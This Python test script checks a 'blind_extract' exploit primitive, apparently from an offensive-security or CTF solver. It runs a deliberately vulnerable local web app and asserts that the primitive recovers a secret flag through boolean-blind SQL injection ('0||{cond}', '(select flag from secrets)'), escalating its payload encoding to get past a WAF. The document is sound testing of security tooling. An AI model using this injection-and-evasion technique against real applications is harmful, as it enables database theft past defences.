"""Live self-check for the blind_extract exploit primitive (solver._blind_extract).

Stands up the POLYMORPHIC Citadel in-process forced to WAF-decode-depth 2 (so a single
encoding layer is blocked), points the primitive at it with a deliberately-too-low
encode_depth=1, and asserts it (a) AUTO-ESCALATES to depth 3 and (b) recovers the real flag
through the boolean-blind oracle in one call. Also checks the calibration-fail diagnostic.

Local socket only (no docker). Run: ./.venv/bin/python verify_blind_extract.py
"""
import sys, threading, time, subprocess
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent / "targets"))
import citadel_poly_app as poly
from citadel_app import FLAG
import solver

PORT = 5099


class HostSB:
    """Minimal sandbox shim: run the primitive's script on the host (it only needs
    python3 + base64 + urllib, all present) so it hits our in-process target."""
    def bash(self, cmd: str) -> str:
        return subprocess.run(["bash", "-lc", cmd], capture_output=True, text=True,
                              timeout=180).stdout


def _serve(depth: int):
    poly.WAF_DEPTH, poly.PARAM = depth, "q"
    poly.RATE_MAX, poly.JITTER_MS = 100000, 0          # no throttle/jitter: deterministic + fast
    t = threading.Thread(target=lambda: poly.app.run(port=PORT, threaded=True),
                         daemon=True)
    t.start()
    time.sleep(1.2)


if __name__ == "__main__":
    _serve(depth=2)                                    # instance requires encode depth 3
    url = f"http://127.0.0.1:{PORT}/api/search?q=0||{{cond}}"

    out = solver._blind_extract(HostSB(), {
        "oracle_url": url, "true_marker": "Widget",
        "subquery": "(select flag from secrets)", "encode_depth": 1, "delay": 0.0})
    print(out.strip())
    assert "BLIND_EXTRACT_OK" in out, "primitive did not complete"
    assert "depth=3" in out, "primitive did not auto-escalate encode depth to clear WAF depth 2"
    assert f"RECOVERED: {FLAG}" in out, f"wrong extraction: {out!r}"
    print(f"  ok  recovered the flag via blind oracle, auto-escalated to encode depth 3")

    bad = solver._blind_extract(HostSB(), {
        "oracle_url": url, "true_marker": "NOT_A_REAL_MARKER", "delay": 0.0})
    assert "BLIND_EXTRACT_FAIL" in bad, "should report calibration failure on a wrong marker"
    print("  ok  clear diagnostic when the oracle can't be calibrated (wrong marker)")

    # arg guards
    assert "must contain the literal token {cond}" in solver._blind_extract(HostSB(),
        {"oracle_url": "http://h/x", "true_marker": "y"})
    assert "true_marker is required" in solver._blind_extract(HostSB(),
        {"oracle_url": "http://h/{cond}", "true_marker": ""})
    print("  ok  arg validation")
    print("\nblind_extract verified: one call, auto-escalating, correct on a live blind oracle")
